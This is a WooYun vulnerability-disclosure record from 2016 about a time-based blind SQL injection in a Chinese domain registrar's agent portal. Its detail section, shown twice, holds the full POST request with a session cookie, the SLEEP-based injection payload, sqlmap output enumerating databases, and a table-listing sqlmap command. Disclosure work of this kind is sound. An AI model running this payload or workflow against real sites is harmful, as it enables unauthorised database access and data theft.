{"id": 85598, "wybug_id": "wooyun-2016-0172298", "wybug_title": "中科三方某站SQL注入漏洞", "wybug_corp": "北京中科三方网络技术有限公司", "wybug_author": "伤心的猫猫", "wybug_date": "2016-01-24 22:36", "wybug_open_date": "2016-03-10 16:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-10：\t细节向公众公开  简要描述： 良心厂商，良心检测！ 详细说明：  站点：http://agent.sfn.cn/domain/list登陆后在搜素我的域名处domainName过滤不严，导致SQL延时注入漏洞：\nPOST /domain/list HTTP/1.1Host: agent.sfn.cnProxy-Connection: keep-aliveContent-Length: 37Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://agent.sfn.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://agent.sfn.cn/domain/listAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=F4119F6BA0E9BAC6348F8E8C865D3CB9; CNZZDATA1000183583=1820725789-1453566204-http%253A%252F%252F210.72.13.110%252F%7C1453598883domainName=*&beginTime=*&endTime=*\n测试注入：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: domainName=%' AND (SELECT * FROM (SELECT(SLEEP(5)))IEmW) AND '%'='&beginTime=&endTime=---[10:31:24] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[10:31:24] [INFO] fetching database names[10:31:24] [INFO] fetching number of databases[10:31:24] [INFO] resumed: 2[10:31:24] [INFO] resumed: information_schema[10:31:24] [INFO] resumed: sanfrontavailable databases [2]:[*] information_schema[*] sanfront\n随便查看一个数据库：C:\\Users\\Administrator\\sqlmap2>sqlmap.py -r 1.txt -D \"sanfront\" --tables\n\n好了，点到为止，数据表就不跑了，乌云白帽子是良心白帽子。   漏洞证明：  站点：http://agent.sfn.cn/domain/list登陆后在搜素我的域名处domainName过滤不严，导致SQL注入漏洞：\nPOST /domain/list HTTP/1.1Host: agent.sfn.cnProxy-Connection: keep-aliveContent-Length: 37Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://agent.sfn.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://agent.sfn.cn/domain/listAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=F4119F6BA0E9BAC6348F8E8C865D3CB9; CNZZDATA1000183583=1820725789-1453566204-http%253A%252F%252F210.72.13.110%252F%7C1453598883domainName=*&beginTime=*&endTime=*\n测试注入：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: domainName=%' AND (SELECT * FROM (SELECT(SLEEP(5)))IEmW) AND '%'='&beginTime=&endTime=---[10:31:24] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[10:31:24] [INFO] fetching database names[10:31:24] [INFO] fetching number of databases[10:31:24] [INFO] resumed: 2[10:31:24] [INFO] resumed: information_schema[10:31:24] [INFO] resumed: sanfrontavailable databases [2]:[*] information_schema[*] sanfront\n随便查看一个数据库：C:\\Users\\Administrator\\sqlmap2>sqlmap.py -r 1.txt -D \"sanfront\" --tables\n\n好了，点到为止，数据表就不跑了，乌云白帽子是良心白帽子。   修复方案：  求多给点rank。   版权声明：转载请注明来源 伤心的猫猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-27 08:57 厂商回复： 正在处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-25 09:18 |    \t\t伤心的猫猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:32        | @sangfor,@qq,@alibaba,@baidu)\t\t \n  感谢人民群众。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}